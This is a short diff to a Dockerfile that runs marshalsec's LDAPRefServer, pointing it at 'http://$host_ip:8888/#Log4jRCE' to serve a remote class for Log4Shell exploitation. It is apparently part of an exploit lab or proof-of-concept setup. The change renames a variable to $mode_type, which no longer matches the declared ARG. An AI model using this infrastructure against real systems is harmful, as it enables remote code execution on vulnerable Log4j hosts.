@@ -14,6 +14,6 @@ RUN mvn package -DskipTests
 WORKDIR /root/new/target
 ARG host_ip
 ARG mode
-CMD java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$host_ip:8888/#Log4jRCE$mode"
+CMD java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$host_ip:8888/#Log4jRCE$mode_type"
 
 EXPOSE 1389
